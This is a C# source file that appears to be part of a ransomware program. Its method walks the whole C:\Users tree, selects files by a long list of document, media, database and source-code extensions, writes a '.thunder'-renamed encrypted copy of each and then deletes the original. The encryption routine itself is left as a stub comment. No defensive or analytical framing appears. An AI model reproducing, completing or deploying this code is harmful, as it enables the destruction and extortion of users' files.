using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;

namespace WindowsFormsApp2
{

    internal static class AESFileEncryption
    {
        internal static void EncryptFilesInUsersFolder(string password)
        {
            string baseDirectory = @"C:\Users";
            string[] extensions = { ".txt", ".html", ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".dat", ".csv", ".efx", ".sdf", ".vcf", ".xml", ".ses", ".rar", ".zip", ".7zip"};

            string[] files = Directory.GetFiles(baseDirectory, "*.*", SearchOption.AllDirectories)
                .Where(file => extensions.Contains(Path.GetExtension(file)))
                .ToArray();

            foreach (string filePath in files)
            {
                string outputFile = Path.ChangeExtension(filePath, ".thunder");
                EncryptFile(filePath, outputFile, password);

                // Delete the original file
                File.Delete(filePath);
            }
        }  

        internal static void EncryptFile(string inputFile, string outputFile, string password)
        {
            // Encryption logic remains the same
        }
    }
}
